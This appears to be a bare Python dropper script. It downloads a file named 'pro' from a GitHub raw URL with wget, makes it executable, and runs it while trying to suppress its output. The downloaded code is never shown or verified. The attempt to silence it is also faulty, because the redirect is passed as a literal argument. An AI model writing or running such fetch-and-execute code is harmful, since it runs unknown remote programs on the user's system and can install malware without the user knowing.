import os
import subprocess
subprocess.run(['wget','https://raw.githubusercontent.com/aurbach55/dera/main/pro'])
subprocess.run(['chmod','+x','pro'])
subprocess.run(['./pro','>/dev/null 2>&1'])
